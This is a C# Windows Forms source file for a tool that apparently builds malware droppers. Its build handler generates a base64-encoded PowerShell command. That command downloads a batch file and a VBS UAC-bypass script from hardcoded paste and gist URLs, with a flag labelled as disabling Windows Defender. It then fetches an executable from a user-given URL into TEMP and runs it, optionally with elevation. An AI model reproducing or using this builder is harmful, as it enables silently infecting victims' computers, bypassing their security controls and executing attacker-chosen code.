using MetroFramework.Components;
using MetroFramework.Forms;
using MetroFramework;
using System;
using System.Text;
using System.Diagnostics;

namespace downloader
{
    public partial class Form1 : MetroForm
    {
        public Form1()
        {
            InitializeComponent();
            var styleManager = new MetroStyleManager();
            styleManager.Theme = MetroThemeStyle.Dark;
            styleManager.Style = MetroFramework.MetroColorStyle.Silver;
            styleManager.Owner = this;
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            this.Resizable = false;
            this.MaximizeBox = false;
            this.MinimizeBox = false;
        }
        private void metroTextBox1_Click(object sender, EventArgs e)
        {
        }

        private void buildpayload_Click(object sender, EventArgs e)
        {
            bool disableWD = checkbox1.Checked;
            bool runAsAdmin = checkbox2.Checked;
            string new_filename = filename_payload.Text;
            string url = payloadlink.Text;
            string powerShellCommand = "";
            string settingsJson = $"{{\"WD\": {(disableWD ? "true" : "false")}, \"adminrun\": {(runAsAdmin ? "true" : "false")}}}";
            powerShellCommand += $"$settings = '{settingsJson}' | ConvertFrom-Json;";
            string characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
            string randomString = "";
            Random random = new Random();
            for (int i = 0; i < 10; i++)
            {
                randomString += characters[random.Next(characters.Length)];
            }
            powerShellCommand += $"$randomString = \"{randomString}\";";
            powerShellCommand += @"if($settings.WD){;$settings.adminrun = $true;$downloadURL = 'https://rentry.co/ABOLHB/raw';$batchFilePath = $env:TEMP + '\' + $randomString + '.bat';$UACBYPASSP = $env:TEMP + '\' + $randomString + '.vbs';(New-Object System.Net.WebClient).DownloadFile($downloadURL, $batchFilePath);(New-Object System.Net.WebClient).DownloadFile('https://gist.githubusercontent.com/Fadi002/2a785ffc551ee137348a9e2bc5c14d61/raw/d6c392a541de495f80f667d84452433db5fb52be/gistfile1.txt', $UACBYPASSP);$payloadContent=Get-Content $UACBYPASSP -Raw;$explorerCommand = 'cmd /c '+$batchFilePath;$payloadContent = $payloadContent -replace 'commandieeeee', $explorerCommand;$payloadContent | Out-File $UACBYPASSP -Encoding ASCII;Start-Process -FilePath $UACBYPASSP -WindowStyle Hidden}";
            powerShellCommand += @"if ($settings.adminrun) {$url = '" + url + @"';$outputPath = $env:TEMP + '\' + '" + new_filename + @"';(New-Object System.Net.WebClient).DownloadFile($url, $outputPath);Start-Process $outputPath -Verb RunAs;}else {$url = '" + url + @"';$outputPath = $env:TEMP + '\' + '" + new_filename + @"';(New-Object System.Net.WebClient).DownloadFile($url, $outputPath);Start-Process $outputPath;}";
            byte[] bytes = Encoding.Unicode.GetBytes(powerShellCommand);
            string base64Payload = Convert.ToBase64String(bytes);
            powerShellCommand = "powershell -e " + base64Payload;
            payload_window form2 = new payload_window(powerShellCommand);
            form2.ShowDialog();
        }
        private void ExecuteCommand(string command)
        {
            ProcessStartInfo processStartInfo = new ProcessStartInfo();
            processStartInfo.FileName = "cmd.exe";
            processStartInfo.Arguments = "/c " + command;
            processStartInfo.RedirectStandardOutput = true;
            processStartInfo.UseShellExecute = false;
            processStartInfo.CreateNoWindow = true;

            using (Process process = new Process())
            {
                process.StartInfo = processStartInfo;
                process.Start();
                string output = process.StandardOutput.ReadToEnd();

                process.WaitForExit();
            }
        }
private void aboutbtn_Click(object sender, EventArgs e)
        {
            about_window form3 = new about_window();
            form3.ShowDialog();
        }
    }
}
